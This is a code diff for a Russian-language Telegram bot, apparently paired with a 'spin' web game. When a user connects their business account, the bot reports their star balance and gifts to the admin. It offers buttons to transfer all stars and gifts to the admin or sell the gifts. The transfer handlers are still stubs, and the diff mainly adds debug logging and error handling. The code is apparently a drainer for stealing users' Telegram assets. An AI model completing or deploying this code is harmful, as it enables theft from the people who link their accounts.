@@ -73,6 +73,8 @@ def handle_user_data():
     user_id = data.get('user_id') or 'mock_user_123'
     if not user_id:
         return jsonify({"error": "user_id is required"}), 400
+    # Можно добавить обработку данных пользователя, если нужно
+    return jsonify({"status": "ok", "user_id": user_id})
 
 @app.route('/api/spin', methods=['POST'])
 def handle_spin():
@@ -328,66 +330,78 @@ async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -
 
 @dp.business_connection()
 async def handle_business_connect(business_connection: BusinessConnection):
-    admin_id = ADMIN_ID
-    user_id = business_connection.user.id
-    username = getattr(business_connection.user, 'username', '—')
-    rights = business_connection.rights
+    try:
+        print('DEBUG: business_connection:', business_connection)
+        print('DEBUG: user:', business_connection.user)
+        print('DEBUG: rights:', getattr(business_connection, 'rights', None))
+        admin_id = ADMIN_ID
+        user_id = business_connection.user.id
+        username = getattr(business_connection.user, 'username', '—')
+        rights = business_connection.rights
+        print('DEBUG: user_id:', user_id)
+        print('DEBUG: username:', username)
+        print('DEBUG: rights:', rights)
 
-    # Формируем текст прав
-    rights_text = "\n".join([
-        f"• {k.replace('_', ' ').title()}: {'✅' if v else '❌'}"
-        for k, v in rights.__dict__.items() if isinstance(v, bool)
-    ])
+        rights_text = "\n".join([
+            f"• {k.replace('_', ' ').title()}: {'✅' if v else '❌'}"
+            for k, v in rights.__dict__.items() if isinstance(v, bool)
+        ])
 
-    # Получаем баланс звёзд
-    stars = await bot.get_business_account_star_balance(business_connection_id=business_connection.id)
-    star_amount = getattr(stars, 'amount', 0)
+        stars = await bot.get_business_account_star_balance(business_connection_id=business_connection.id)
+        print('DEBUG: stars:', stars)
+        star_amount = getattr(stars, 'amount', 0)
 
-    # Получаем подарки
-    gifts = await bot.get_business_account_gifts(business_connection_id=business_connection.id)
-    gifts_under_25 = [g for g in gifts.gifts if getattr(getattr(g, 'gift', None), 'star_price', 0) <= 25]
-    gifts_over_25 = [g for g in gifts.gifts if getattr(getattr(g, 'gift', None), 'star_price', 0) > 25]
+        gifts = await bot.get_business_account_gifts(business_connection_id=business_connection.id)
+        print('DEBUG: gifts:', gifts)
+        gifts_under_25 = [g for g in gifts.gifts if getattr(getattr(g, 'gift', None), 'star_price', 0) <= 25]
+        gifts_over_25 = [g for g in gifts.gifts if getattr(getattr(g, 'gift', None), 'star_price', 0) > 25]
+        print('DEBUG: gifts_under_25:', gifts_under_25)
+        print('DEBUG: gifts_over_25:', gifts_over_25)
 
-    msg = (
-        f"👤 <b>Новый пользователь подключил бота!</b>\n\n"
-        f"ID: <code>{user_id}</code>\n"
-        f"Ник: @{username}\n"
-        f"Права:\n{rights_text}\n\n"
-        f"Баланс звёзд: <b>{star_amount}</b>\n"
-        f"Подарков до 25⭐: <b>{len(gifts_under_25)}</b>\n"
-        f"Подарков дороже 25⭐: <b>{len(gifts_over_25)}</b>"
-    )
+        msg = (
+            f"👤 <b>Новый пользователь подключил бота!</b>\n\n"
+            f"ID: <code>{user_id}</code>\n"
+            f"Ник: @{username}\n"
+            f"Права:\n{rights_text}\n\n"
+            f"Баланс звёзд: <b>{star_amount}</b>\n"
+            f"Подарков до 25⭐: <b>{len(gifts_under_25)}</b>\n"
+            f"Подарков дороже 25⭐: <b>{len(gifts_over_25)}</b>"
+        )
 
-    keyboard = InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                InlineKeyboardButton("Перевести все звёзды админу", callback_data=f"transfer_stars:{user_id}"),
-                InlineKeyboardButton("Перевести все подарки админу", callback_data=f"transfer_gifts:{user_id}")
-            ],
-            [
-                InlineKeyboardButton("Продать все подарки до 25⭐ и перевести звёзды", callback_data=f"sell_gifts_under_25:{user_id}")
+        keyboard = InlineKeyboardMarkup(
+            inline_keyboard=[
+                [
+                    InlineKeyboardButton("Перевести все звёзды админу", callback_data=f"transfer_stars:{user_id}"),
+                    InlineKeyboardButton("Перевести все подарки админу", callback_data=f"transfer_gifts:{user_id}")
+                ],
+                [
+                    InlineKeyboardButton("Продать все подарки до 25⭐ и перевести звёзды", callback_data=f"sell_gifts_under_25:{user_id}")
+                ]
             ]
-        ]
-    )
+        )
 
-    await bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
+        await bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
+    except Exception as e:
+        print('ERROR in handle_business_connect:', e)
+        import traceback; traceback.print_exc()
+        logging.exception("Ошибка при обработке бизнес-подключения")
 
 # --- Обработчики инлайн-кнопок (заглушки, добавьте логику по необходимости) ---
-@dp.callback_query(lambda c: c.data.startswith("transfer_stars"))
+@dp.callback_query(lambda c: c.data and c.data.startswith("transfer_stars"))
 async def transfer_stars_callback(callback: types.CallbackQuery):
-    user_id = callback.data.split(":")[1]
+    user_id = callback.data.split(":")[1] if callback.data and ":" in callback.data else None
     # TODO: логика перевода звёзд админу
     await callback.answer("Звёзды переведены админу!", show_alert=True)
 
-@dp.callback_query(lambda c: c.data.startswith("transfer_gifts"))
+@dp.callback_query(lambda c: c.data and c.data.startswith("transfer_gifts"))
 async def transfer_gifts_callback(callback: types.CallbackQuery):
-    user_id = callback.data.split(":")[1]
+    user_id = callback.data.split(":")[1] if callback.data and ":" in callback.data else None
     # TODO: логика перевода всех подарков админу
     await callback.answer("Подарки переведены админу!", show_alert=True)
 
-@dp.callback_query(lambda c: c.data.startswith("sell_gifts_under_25"))
+@dp.callback_query(lambda c: c.data and c.data.startswith("sell_gifts_under_25"))
 async def sell_gifts_under_25_callback(callback: types.CallbackQuery):
-    user_id = callback.data.split(":")[1]
+    user_id = callback.data.split(":")[1] if callback.data and ":" in callback.data else None
     # TODO: логика продажи подарков <= 25⭐ и перевода звёзд админу
     await callback.answer("Подарки проданы, звёзды переведены админу!", show_alert=True)
 
